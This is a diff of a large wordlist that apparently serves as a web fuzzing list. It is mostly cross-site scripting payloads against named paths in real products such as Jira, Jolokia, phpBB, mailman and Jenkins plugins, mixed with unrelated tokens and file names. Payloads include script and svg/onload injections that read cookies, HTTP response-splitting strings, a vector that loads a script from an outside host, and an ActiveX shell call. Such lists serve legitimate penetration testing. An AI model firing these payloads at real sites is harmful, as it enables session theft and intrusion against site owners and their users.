@@ -20866,7 +20738,6 @@ commonmodel_onmousedown
 commonmodel_onmouseup
 commonmodel_onmousewheel
 components/com_cgtestimonial/video.php?url="><script>alert('xss');</script>
-config/postprocessing/testnaming?pattern=%3csvg/onload=alert(document.domain)%3e
 confirm(1)".replace(/.+/,eval)//
 confirm(1)>>>/xss
 confirm(<xss>xs{[function::status]}s</xss>)
@@ -20879,17 +20750,11 @@ confirm(window.tostatichtml('<label style="overflow:hidden;background:red;displa
 confirm(window.tostatichtml('<marquee>foo</marquee>'));
 confirm`1`; var something = `abc${confirm(1)}def`; ``.constructor.constructor`confirm\`1\````;
 confocus
-contact.php?theme=tes%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 contests?*onmouseover=
-control/stream?contentid=%27\%22%3e%3csvg/onload=alert(/xss/)%3e
-control/stream?contentid=<svg/onload=alert(1)>
 controlsvisibleonload=
 cottonmouse
-creaprezzi.php?prezzoperiodo4=%22><script>javascript:alert(%27xss%27)</script>
-create_user/?username=%3cscript%3ealert(document.domain)%3c%2fscript%3e
 crimsonblur
 crowdshield xss agent"><script/src=https://crowdshield.com/.testing/useragent.js>
-cutesoft_client/cuteeditor/template.aspx?referrer=xss";><script>alert(document.domain)</script>
 cvsblame.cgi?file=<script>alert('vulnerable')</script>
 cvsblame.cgi?file=<script>alert('xss')</script>
 cvslog.cgi?file=*&rev=&root=<script>alert('vulnerable')</script>
@@ -20905,10 +20770,8 @@ cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('xss')</script>&branch=he
 d="alert('crosssitescripting');\")";
 d="alert('xss');\")";
 d=\"alert('xss');\\")\";
-damonblur
 dansguardian.pl?deniedurl=</a><script>alert('vulnerable');</script>
 dansguardian.pl?deniedurl=</a><script>alert('xss');</script>
-dashboard/snapshot/%7b%7bconstructor.constructor(%27alert(document.domain)%27)()%7d%7d?orgid=1
 data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2)}
 data:text/html base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k
 data:text/html,%3cscript%3ealert(1)%3c%2fscript%3e
@@ -20931,7 +20794,6 @@ data:text/html;base64,phnjcmlwdd5wcm9tchqomsk8l3njcmlwdd4=
 data:text/html;charset=utf-7;base64,ij48l3rpdgxlpjxzy3jpchq+ywxlcnqomtmznyk8l3njcmlwdd4=
 data:text/html<svg/onload=parentnode.parentnode.parentnode[/locatio/.source+/n/.source]='javascript:confirm(4)'//>
 data:www.whitelisteddomain.tld;text/html;charset=utf-8,<html><script>document.write(document.domain);</script><iframe/src=xxxxx>aaaa</iframe></html>
-dati/availability_tpl.php?num_app_tipo_richiesti1=%22><script>javascript:alert(%27xss%27)</script>
 debug/dbg?host==<script>alert('vulnerable');</script>
 debug/echo?name=<script>alert('vulnerable');</script>
 debug/errorinfo?title===<script>alert('vulnerable');</script>
@@ -20939,26 +20801,16 @@ debug/showproc?proc===<script>alert('vulnerable');</script>
 delete []['__proto__']['tostring'];[]['__proto__'][symbol.tostringtag]='=alert(1)';eval([1,2,3]+'');
 delete confirm(1)
 designerregionmouseeventargs.xml
-devices-config.php?sta=%22%3e%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e
 diapo.php?rep=<script>alert(document.cookie)</script>
-dms/dlasx.kspx?shidx=<script>foo</script>
-dms/mediashowplay.kspx?pic=0&idx=<script>foo</script>
-dms/mediashowplay.kspx?pic=<script>foo</script>&idx=0
-dms/slideshow.kspx?source=<script>foo</script>
 docs/<script>alert('vulnerable');</script>
 document.body.innerhtml=('<\000\0i\000mg src=xx:x onerror=alert(1)>')  #ie #xss
 document.body.innerhtml=('<\000\0i\000mg src=xx:x onerror=confirm(1)>')
 document.write('<iframe src="http://127.0.0.1:3555/xss_serve_payloads/x.html" style="border: 0; width: 100%; height: 100%"></iframe>')
 document.write('<img src="<iframe/onload=confirm(1)>\0">')
-does_not_exist"%22%3e%3cscript%3ealert("xss")%3c/script%3e<img%20src=x
-dokuwiki/doku.php?id=wiki:welcome&at=<svg%20onload=alert(document.domain)>
 download.php?sortby=&dcategory=<script>alert('vulnerable')</script>
 downloads/pafiledb.php?action=download&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
 downloads/pafiledb.php?action=email&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
 downloads/pafiledb.php?action=rate&id=4?\"&lt;script&gt;alert('vulnerable')&lt;/script&gt;\"
-dragonmouse
-e/viewimg/index.html?url=javascript:alert(1)
-e/viewimg/index.html?url=javascript:alert(document.domain)
 echo "  -i <input file to use> parse an input file, not a burp log. input files can be created using the -p switch"
 echo "  -p <input file to create> parse mode: create an input file from a burp log. this can subsequently be scanned using the -i option. also requires -l <burplog> to parse"
 echo "-l <burplog> or -i <input file>">&2
@@ -20977,15 +20829,10 @@ echo('ipt&gt;alert(1)&lt;/script&gt;'); ?&gt;
 echo('ipt&gt;alert(\"xss\")&lt;/script&gt;'); ?&gt;
 echo('ipt>alert("crosssitescripting")</script>'); ?>
 echo('ipt>alert("xss")</script>'); ?>
-editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path=
-eent/onblur.html
-eent/onfocus.html
 element[attribute='<img src=x onerror=alert('xss');>
-email.php?forum_contact=\"><script>foo</script>
 emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailfaq.php?id=\"<script>alert(document.cookie)</script>
 emailfriend/emailnews.php?id=\"<script>alert(document.cookie)</script>
-emotionfocused
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0acontent-type%3a%20text%2fhtml%0alocation%3a%20http%3a%2f%2fcrowdshield.com%0acontent-length%3a%20122%0a%3chtml%3e%3cbody%20onload%3dalert('xss')%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e%3ciframe%20src%3d%22javascript%3aalert('xss')%3b%22%3e%3c%2fiframe%3e%3c%2fbody%3e%3c%2fhtml%3e
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0adate%3a%20fri%2c%2006%20mar%202016%2000%3a07%3a47%20gmt%0acontent-type%3a%20text%2fhtml%3bcharset%3diso-8859-1%0acontent-length%3a%2040%0a%3chtml%3e%3cbody%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e
 en%0acontent-length%3a%200%0a%0ahttp%2f1.1%20200%20ok%0adate%3a%20fri%2c%2006%20mar%202016%2000%3a07%3a47%20gmt%0alast-modified%3a%20fri%2c%2006%20mar%202017%2000%3a07%3a47%20gmt%0acontent-type%3a%20text%2fhtml%3bcharset%3diso-8859-1%0acontent-length%3a%2040%0a%3chtml%3e%3cbody%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e
@@ -21011,13 +20858,8 @@ entry_title_onmouseup.xml
 environ.pl?param1=<script>alert(document.cookie)</script>
 erba/start/%3cscript%3ealert('vulnerable');%3c/script%3e
 erba/start/%3cscript%3ealert('xss');%3c/script%3e
-error.php?server_name=<script>alert(document.domain)</script>
 error/500error.jsp?et=1<script>alert('vulnerable')</script>;
-esbaseadmin/default/login.php?msg=<script>alert(document.cookie);</script>
-escontacts/login.php?msg=<script>alert(document.cookie);</script>
-esnews/admin/news/modifier.php?msg=<script>alert(document.cookie);</script>
 esp?page=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
-espartenaires/login.php?msg=<script>alert(document.cookie);</script>
 etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf.res?contentpath=%5c"))%7dcatch(e)%7balert(document.domain)%7d//
 etc/clientlibs/foundation/shared/endorsed/swf/slideshow.swf?contentpath=%5c"))%7dcatch(e)%7balert(document.domain)%7d//
 etc/clientlibs/foundation/video/swf/player_flv_maxi.swf.res?onclick=javascript:confirm(document.domain)
@@ -21028,7 +20870,6 @@ etc/dam/viewers/s7sdk/2.11/flash/videoplayer.swf.res?stagesize=1&namespaceprefix
 etc/dam/viewers/s7sdk/2.11/flash/videoplayer.swf?stagesize=1&namespaceprefix=alert(document.domain)-window
 etc/dam/viewers/s7sdk/2.9/flash/videoplayer.swf.res?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//
 etc/dam/viewers/s7sdk/2.9/flash/videoplayer.swf?loglevel=,firebug&movie=%5c%22));if(!self.x)self.x=!alert(document.domain)%7dcatch(e)%7b%7d//
-etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
 eval("s=document.createelement('script');alert(1);document.getelementsbytagname('head')[0].appendchild(s)")
 eval('alert(1)')
 eval(json.stringify({a:1},null,'alert(1)//'))
@@ -21222,8 +21063,6 @@ feed_title_onmouseover.xml
 feed_title_onmouseup.xml
 ff <applet code=javascript:alert('sgl')> by @jackmasa
 ff <img src="jar:!/"> no referrer by @sneak_
-filter/jmol/iframe.php?_use=%22};alert(1337);//
-filter/jmol/js/jsmol/php/jsmol.php?call=savefile&data=%3cscript%3ealert(%27xss%27)%3c/script%3e&mimetype=text/html
 firefox <iframe src=view-source://xxxx.com>; with drag and drop
 firefox <img src=javascript:while([{}]);>
 firefox clipboard-hijack without script and css : http://<img alt="evil/#" width=0 height=0 >
@@ -21233,10 +21072,8 @@ firefoxurl:test" -chrome "javascript:c=components.classes;i=components.interface
 firefoxurl:test|"%20-new-window%20javascript:alert(\'cross%2520browser%2520scripting!\');"
 firewall/policy/dlg?q=-1&fzone=t<script>alert('vulnerable')</script>>&tzone=dmz
 firewall/policy/policy?fzone=internal&tzone=dmz1<script>alert('vulnerable')</script>
-flash/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)}
 floatingchatframedownbutton_onmousedown
 floatingchatframeupbutton_onmousedown
-fmlurlsvc/?=&url=https%3a%2f%2fgoogle.com<svg%2fonload%3dalert(document.domain)>
 focus:query-builder#clearbuttonfocus
 focusframe_onmousedown
 focusframe_onmouseup
@@ -21248,16 +21085,6 @@ fom/fom.cgi?cmd=<script>alert('vulnerable')</script>&file=1&keywords=vulnerable
 fom/fom.cgi?cmd=<script>alert('xss')</script>&file=1&keywords=vulnerable
 foo%00<script>alert(1)</script>
 foo%00<script>alert(document.cookie)</script>
-foo.cfm?param=<script>foo</script>
-foo.cfm?param=<script>foo</script>.cfm
-foo.jsp?param=<script>foo</script>
-foo.jsp?param=<script>foo</script>.jsp
-foo.php?param=<script>foo</script>
-foo.php?param=<script>foo</script>.php
-foo.shtml?param=<script>foo</script>
-foo.shtml?param=<script>foo</script>.shtml
-foo.thtml?param=<script>foo</script>
-foo.thtml?param=<script>foo</script>.thtml
 foo<script>alert(1)</script>
 foo<script>alert(document.cookie)</script>
 foo\’; alert(1);//’;
@@ -21266,8 +21093,6 @@ for(i=10;i>1;i--)confirm(i);new activexobject("wscript.shell").run('calc.exe',1,
 forceapplicationfocus
 forgot_password.php?email=\"><script>alert(document.cookie)</script>
 formmail.cgi?<script>alert(\
-forms/rpauth_1?id=</form><img%20src=x%20onerror="prompt(document.domain)"><form>
-forum/email.php?forum_contact=\"><script>foo</script>
 forum/index.php?method=&lt;script&gt;alert('vulnerable')&lt;/script&gt;
 forum/memberlist.php?s=23c37cf1af5d2ad05f49361b0407ad9e&what=\">\"<script>javascript:alert(document.cookie)</script>
 forum_members.asp?find=%22;}alert('vulnerable');function%20x(){v%20=%22
@@ -21275,7 +21100,6 @@ forums/browse.php?fid=3&tid=46&go=<script>javascript:alert('vulnerable');</scrip
 forums/index.php?board=;action=login2&user=username&cookielength=120&passwrd=password<script>alert('vulnerable')</script>
 forums/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 fragment_nonfocusable_webview_in_nestedscrollview.xml
-free_time_failed.cgi?err_msg=<script>alert(document.domain);</script>
 friend.php?op=sitesent&fname=<script>alert('vulnerable')</script>
 function document::onreadystatechange(){alert(1);}
 function("a=`","`,xss=1){alert(xss)")()
@@ -21284,7 +21108,6 @@ function('a=[class a extends function(','}]){alert(1)')()
 function.prototype.tostring=function.prototype.call;"alert(1)//".replace("//",function)
 function`alert(1)```````````
 fundacionfocus-com
-gallery/search.php?dosearch=true&query=\"><script>alert(document.cookie)</script>
 gallery/search.php?searchstring=<script>alert(document.cookie)</script>
 garethy salty method!<script>alert(components.lookupmethod(components.lookupmethod(components.lookupmethod(components.lookupmethod(this,'window')(),'document')(), 'getelementsbytagname')('html')[0],'innerhtml')().match(/d.*'/));</script>
 gbbs_onmousewheel
@@ -21292,16 +21115,11 @@ geturl("javascript:alert('xss')")
 geturl("javascript:confirm(document.location)")
 gif89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 gif_listscrollbar_onmousewheel
-global-protect/login.esp?user=j%22;-alert(1)-%22x
-goform/login_process?username=test%22%3e%3csvg/onload=alert(document.domain)%3e
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="http://www.whatismyip.com/"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="whatismyip.com"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe></iframe>
-gpuimagemotionblurfilter.h
-gpuimagemotionblurfilter.m
 gsf_onmousedown
 gsf_onmouseup
-guest/users/forgotten?email=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
 guestbook/?number=5&lng=%3cscript%3ealert(document.domain);%3c/script%3e
 guildbanklogscrollbar_onmousewheel
 guildframe_onmousewheel
@@ -21315,10 +21133,7 @@ handonmouse
 header('refresh: 0;url=javascript:alert(1)');
 header('refresh: 0;url=javascript:confirm(1)');
 help.php?chapter=<script>alert('vulnerable')</script>
-help/english/index.html?javascript:alert(document.domain)
-help/index.jsp?view=%3cscript%3ealert(document.cookie)%3c/script%3e
 holo_selector_nonfocusable.xml
-home/get_products?search=%22%3e%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e
 hopdisplayproducts.asp?id=1&cat=<script>alert(document.cookie)</script>
 housechangetypescrollbar_onmousewheel
 housefriend_addfrienddialogtool_scrollbar_onmousewheel
@@ -21358,7 +21173,6 @@ http://www.google<script .com>confirm(document.location)</script
 https-admserv/bin/index?/<script>alert(document.cookie)</script>
 iconfocusedargs.xml
 iconfocusedhandler.xml
-ics?tool=search&query=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 id=xss src=&#10<img 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 ie <!-- `<img/src=xx:xx onerror=alert(1)//--!> by @jackmasa h5sc:
 ie <!--[if<img src=x:x onerror=alert(5)//]--> by @0x6d6172696f h5sc#115
@@ -21374,8 +21188,6 @@ ie9 <script/onload=alert(1)></script>
 if(1)alert(' @jackmasa ')}{ works in firebug and webkit's console
 if(1)confirm(1)}{
 ifr.onload = obj.onload;
-igen/?pg=dlasx.kspx&shidx=<script>foo</script>
-ilonmouse82
 imf_filterbutton_onmousewheel
 img-onmousedown.xml
 img-onmousemove.xml
@@ -21385,36 +21197,22 @@ img-onmouseup.xml
 inc/session.php?sessionerror=0&lang= inc
 inc_dungeonblurbs.xml
 include.php?path=contact.php&contact_email=\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
-include/ckeditor/plugins/jwplayer/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)}
-includes/plupload//hostmarker:portmaker/?id=\"));}catch(e){alert(1);}//
-index.jsp?operatorlocale=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 index.php/\"><script><script>alert(document.cookie)</script><
 index.php/content/advancedsearch/?searchtext=<script>alert(document.cookie)</script>&phrasesearchtext=<script>alert(document.cookie)</script>&searchcontentclassid=-1&searchsectionid=-1&searchdate=-1&searchbu
 index.php/content/search/?sectionid=3&searchtext=<script>alert(document.cookie)</script>
 index.php/image-gallery/"><script>alert('xss')</script>/25-koala
-index.php/javascript%26colon%3balert(document.domain);dd%26sol%3b%26sol%3b
-index.php?_a=knowledgebase&_j=search&searchm=<script>alert(document.cookie)</script>
 index.php?action=search&searchfor=\"><script>alert('vulnerable')</script
 index.php?action=storenew&username=<script>alert('vulnerable')</script>
-index.php?appservlang=%3csvg%2fonload=confirm%28%27xss%27%29%3e
 index.php?catid=&lt;script&gt;alert('vulnerable')&lt;/script&gt;
-index.php?cmd=search&keywords=\"><script>alert(document.cookie);</script>
 index.php?dir=<script>alert('vulnerable')</script>
-index.php?err=3&email=<script>foo</script>
 index.php?err=3&email=\"><script>alert(document.cookie)</script>
-index.php?error=<script>foo</script>
 index.php?file=liens&op=\"><script>alert('vulnerable');</script>
-index.php?file=liens&op=\"><script>window.alert('test');</script>
-index.php?function=add_kom&no=<script>foo</script>
 index.php?option=search&searchword=<script>alert(document.cookie);</script>
-index.php?path=<script>malicious_code</script>
 index.php?rep=<script>alert(document.cookie)</script>
-index.php?section=<script>alert(document.cookie)</script>&action=login
 index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 index.php?topic=&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;%20
 index.php?vo=\"><script>alert(document.cookie);</script>
 inertia-clickjacking for(i=10;i>1;i--)alert(i);new activexobject("wscript.shell").run('calc.exe',1,true); by @80vul
-info.php?result=",msgarray);alert(document.domain);//
 innerhtml=location.hash>#<script>alert(1)</script>
 innerhtml=location.hash>#<script>alert(1)</script>onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);
 input-onblur.xml
@@ -21434,43 +21232,24 @@ intext:"mailinx alert (notify)" -site:networkprinters.com
 ipt:alert(0))}
 ironmouse
 ironmouse000
-ironmouse1
 ironmouse13
 ironmouse14
-ironmouse15
 ironmouse189
-ironmouse19
-ironmouse2
 ironmouse20
 ironmouse282
-ironmouse3
 ironmouse31
 ironmouse321
-ironmouse34
 ironmouse374
-ironmouse38
-ironmouse39
-ironmouse4
-ironmouse40
-ironmouse45
 ironmouse47
 ironmouse5
 ironmouse53
-ironmouse56
-ironmouse59
 ironmouse6
-ironmouse69
-ironmouse7
 ironmouse70
 ironmouse786
 ironmouse79
-ironmouse8
 ironmouse80
-ironmouse81
 ironmouse82
-ironmouse88
 ironmouse9
-ironmouse914
 ironmouse98
 isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
 item_body_onblur.xml
@@ -21503,7 +21282,6 @@ item_xhtml_body_onmousedown.xml
 item_xhtml_body_onmouseout.xml
 item_xhtml_body_onmouseover.xml
 item_xhtml_body_onmouseup.xml
-iwc/idcstateerror.iwc?page=javascript%3aalert(document.domain)%2f%2f
 j&#x61;v&#x41;sc&#x52;ipt&#x3a;alert(1)
 j&newline;a&newline;vas&newline;cript:confirm(1);
 ja&#x0000a;vascript:alert(1)
@@ -21679,10 +21457,6 @@ javascript:propmpt(1)
 javascript:void(0)
 javascript:x='%27-alert(1)-%27';
 javascript<tab>:alert(1)
-jira/secure/browseproject.jspa?id=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
-jolokia/read<svg%20onload=alert(document.domain)>?mimetype=text/html
-jolokia/read<svgonload=alert(document.domain)>?mimetype=text/html
-jonfocus03
 jquery 1.8 a new method: $.parsehtml('<img src=xx:x onerror=alert(1)>')
 junk(223)<font%20size=50><script>alert('vulnerable')</script><!--//--
 just don't support ie <a href=[0x0b]" onclick=alert(1)//">click</a>
@@ -21711,10 +21485,8 @@ left:expr\0065ssion(alert('xss'))
 left:expr\65ssion(alert('xss') ))
 lemonmouse
 lemonmouse138
-lemonmouse32
 lemonmouse555
 lemonmouse624
-lemonmouse683
 lemonmouse998
 libmotionblur_plugin.dll
 libmotionblur_plugin.dll.dbg
@@ -21723,7 +21495,6 @@ libs/cq/ui/resources/swfupload/swfupload.swf.res?moviename=%22])%7dcatch(e)%7bif
 libs/cq/ui/resources/swfupload/swfupload.swf?moviename=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//
 libs/dam/widgets/resources/swfupload/swfupload_f9.swf.res?swf?moviename=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//
 libs/dam/widgets/resources/swfupload/swfupload_f9.swf?swf?moviename=%22])%7dcatch(e)%7bif(!this.x)alert(document.domain),this.x=1%7d//
-loadframe?frame_name=x&src=x&single_signout=x%27%3e%3c/iframe%3e%3cscript%3ealert(1)%3c/script%3e
 location.href`javascript:alert(1)`
 location.reload`javascript:alert(1)`
 location='javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c %75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)'
@@ -21733,46 +21504,24 @@ location='javascript\u0000:alert()'
 location=javascript:confirm(0);.
 location=name//','javascript:alert(1)');
 location`javascript:alert(1)`
-log?type=%22%3c/script%3e%3cscript%3ealert(document.domain);%3c/script%3e%3cscript%3e
-login.php/'%3e%3csvg/onload=confirm%60xss%60%3e
-login/?redirectto=/tenant/e&service=</script><script>alert(document.domain)</script>
-login/?uid=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
-login/forgetpswd.php?loginsys=1&loginname=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e
 login/sm_login_screen.php?error=\"><script>alert('vulnerable')</script>
 login/sm_login_screen.php?uid=\"><script>alert('vulnerable')</script>
-login?!'><svg/onload=alert`1337`//
-login?!><svg/onload=alert`1337`//
 logincolortextureframe_onmousedown
 logincolortextureframe_onmouseup
 loginscrollbar_onmousewheel
 loginscrolldownbutton_onmousedown
 loginscrollframe_onmousewheel
 loginscrollupbutton_onmousedown
-logout?next=%208%22onmouseover=%22alert(document.domain)
-logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
 londonfocus1
 londonfocus2476
-lostpassword.php/n4gap%22%3e%3cimg%20src=a%20onerror=alert(%22document.domain%22)%3e
-magmi/web/ajax_gettime.php?prefix=%22%3e%3cscript%3ealert(document.domain);%3c/script%3e%3c
 mail/addressaction.html?id=<userid#>&newaddress=1&addressname=<script>alert('vulnerable')</script>&addressemail=junk@example.com
 mailman/admin/ml-name?\"><script>alert('vulnerable')</script>;
 mailman/listinfo/<script>alert('vulnerable')</script>
 mailman/options/yourlist?language=en&email=&lt;script&gt;alert('vulnerable')&lt;/script&gt;
-main/blank?message_error=%3cimg%20src%3dc%20onerror%3dalert(8675309)%3e
-main/blank?message_success=%3cimg%20src%3dc%20onerror%3dalert(8675309)%3e
-main/calendar/agenda_list.php?type=xss"+onmouseover=alert(document.domain)+"
 material_selector_nonfocusable.xml
 megabook/admin.cgi?login=<script>alert('vulnerable')</script>
 members.asp?sf=%22;}alert('vulnerable');function%20x(){v%20=%22
-message?title=x&msg=%26%23%3csvg/onload=alert(1337)%3e%3b
-message?title=x&msg=%26%23<svg/onload=alert(1337)>
-microstrategylibrary/auth/ui/loginpage?loginmode=alert(document.domain)
 middleman::extensions::minifyjavascript::rack
-mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://
-mobile/shop/lg/mispwapurl.php?lgd_oid=%3cscript%3ealert(document.domain)%3c/script%3e
-modifica_cliente.php?tipo_tabella=%22><script>javascript:alert(%27xss%27)</script>&idclienti=1
-mods/clansphere/lang_modvalidate.php?language=language&module=module%22></script><script>alert(document.domain)</script>
-module/?module=admin%2fmodules%2fmanage&id=test%22+onmousemove%3dalert(document.domain)+xx=%22test&from_url=x
 modules.php?letter=%22%3e%3cimg%20src=javascript:alert(document.cookie);%3e&op=modload&name=members_list&file=index
 modules.php?name=classifieds&op=viewads&id_subcatg=75&id_catg=<script>alert('vulnerable')</script>
 modules.php?name=downloads&d_op=viewdownloaddetails&lid=02&ttitle=<script>alert('vulnerable')</script>
@@ -21804,28 +21553,11 @@ monmouse
 moonmouse
 motionblur
 motionblur-no
-motionblur.c
-motionblur.cginc
-motionblur.cginc.meta
-motionblur.cs
-motionblur.cs.meta
 motionblur.exe
-motionblur.shader
-motionblur.shader.meta
 motionblur.xml
 motionblur.zip
 motionblur2.zip
-motionblurclear.shader
-motionblurclear.shader.meta
-motionblurcomponent.cs
-motionblurcomponent.cs.meta
-motionblurcomponent.java
 motionblurimage.xml
-motionblurjitter.png.meta
-motionblurmodel.cs
-motionblurmodel.cs.meta
-motionblurmodeleditor.cs
-motionblurmodeleditor.cs.meta
 motionblurz1
 mozilla&lt;img src=javascript:qss=7&gt;
 mozilla&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:qss=7&quot;&gt;
@@ -21862,7 +21594,6 @@ ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com
 no dos expression vector <i style=x:expression(alert(url=1))>
 no referer : <iframe src="javascript:'<script src=>;</script>'"></iframe>
 node/view/666\"><script>alert(document.domain)</script>
-nonfocus
 nosuchurl/><script>alert('vulnerable')</script>
 npctracknpclistscrollbar_onmousewheel
 npctracksearchresultlistscrollbar_onmousewheel
@@ -21884,13 +21615,11 @@ onerror=
 onerror=confirm;throw 1;
 onerror=eval;throw'=confirm\x281\x29';
 onerror=eval;throw'alert\x281\x29';
-oneview/view/center?a%27+type%3d+%27text%27+autofocus+onfocus%3d%27alert(document.domain)
 onfocus
 onfocus-com
 onfocus.html
 onfocus=javascript:alert(123) autofocus
 onfocus=javascript:alert(9) autofocus
-onfocuschange.java
 onfocusin
 onfocusout
 onfocusti
@@ -21921,7 +21650,6 @@ onmouseover=alert(1);
 onmouseoverprompt1
 onmouseup
 onmousewheel
-onmousewheel.sqf
 onmousewheel_cardfarmescorllitem
 open`javascript:alert(1)//#${'_self'}`
 openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
@@ -21946,12 +21674,9 @@ p=<svg 1='&q='onload='/*&r=*/alert(1)'>
 p=<svg/1='&q='onload=alert(1)>
 p=\&q=-alert(1)//
 p=`-alert(1)">'onload="`<svg/1='
-pacs/login.php?message=%3cimg%20src=%22%22%20onerror=%22alert(1);%22%3e1%3c/img%3e
 page/1,10966,,00.html?var=<script>alert('vulnerable')</script>
 pages/htmlos/%3cscript%3ealert('vulnerable');%3c/script%3e
-passwordreset?bundle=';alert(document.domain);var+ok='
 pauseonfocus
-payform.php?type=upgrade&upgradeid=1&upgradegd=6&price=123&t=1&note=%3c/textarea%3e%3cscript%3ealert(document.domain)%3c/script%3e
 peframe_button_onmousedown
 peframe_button_onmouseup
 pensionblurb
@@ -21980,11 +21705,6 @@ personblurb
 pforum/edituser.php?boardid=&agree=1&username=%3cscript%3ealert('vulnerable')%3c/script%3e&nickname=test&email=test@example.com&pwd=test&pwd2=test&filled=1
 phorum/admin/footer.php?globals[message]=<script>alert('vulnerable')</script>
 phorum/admin/header.php?globals[message]=<script>alert('vulnerable')</script>
-php/change_password.php/%22%3e%3csvg%2fonload%3dalert(1)%3e
-php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22
-php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22
-php/device_graph_page.php?is2sim=%22zlo%20onerror=alert(1)%20%22
-php/ssh_form.php?hostname=%3c/title%3e%3cscript%3ealert(document.domain)%3c/script%3e%3ctitle%3e
 phpbb/viewtopic.php?t=17071&highlight=\">\"<script>javascript:alert(document.cookie)</script>
 phpbb/viewtopic.php?topic_id=<script>alert('vulnerable')</script>
 phpclassifieds/latestwap.php?url=<script>alert('vulnerable');</script>
@@ -22000,20 +21720,9 @@ phpwebsite/index.php?module=calendar&calendar[view]=day&month=2&year=2003&day=1+
 phpwebsite/index.php?module=fatcat&fatcat[user]=viewcategory&fatcat_id=1%00+\"><script>alert('vulnerable')</script>
 phpwebsite/index.php?module=pagemaster&page_user_op=view_page&page_id=10\"><script>alert('vulnerable')</script>&mmn_position=[x:x]
 phpwebsite/index.php?module=search&sea_search_op=continue&pda_limit=10\"><script>alert('vulnerable')</script>
-pin/catego<script
 pinionfocusingmicroscope
-platform/platform-resources-en/src/tips/quickdoconmousemove.html
 pls/dadname/htp.print?cbuf=<script>alert('vulnerable')</script>
 pls/help/<script>alert('vulnerable')</script>
-plugin/build-metrics/getbuildstats?label=%22%3e%3csvg%2fonload%3dalert(1337)%3e&range=2&rangeunits=weeks&jobfilteringtype=all&jobfilter=&nodefilteringtype=all&nodefilter=&launcherfilteringtype=all&launcherfilter=&causefilteringtype=all&causefilter=&jenkins-crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7b%22label%22%3a+%22search+results%22%2c+%22range%22%3a+%222%22%2c+%22rangeunits%22%3a+%22weeks%22%2c+%22jobfilteringtype%22%3a+%22all%22%2c+%22jobnameregex%22%3a+%22%22%2c+%22jobfilter%22%3a+%22%22%2c+%22nodefilteringtype%22%3a+%22all%22%2c+%22nodenameregex%22%3a+%22%22%2c+%22nodefilter%22%3a+%22%22%2c+%22launcherfilteringtype%22%3a+%22all%22%2c+%22launchernameregex%22%3a+%22%22%2c+%22launcherfilter%22%3a+%22%22%2c+%22causefilteringtype%22%3a+%22all%22%2c+%22causenameregex%22%3a+%22%22%2c+%22causefilter%22%3a+%22%22%2c+%22jenkins-crumb%22%3a+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7d&submit=search
-plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>
-plugins/servlet/svnwebclient/changedresource.jsp?url=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
-plugins/servlet/svnwebclient/commitgraph.jsp?%27)%3balert(%22xss
-plugins/servlet/svnwebclient/commitgraph.jsp?url=%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3e
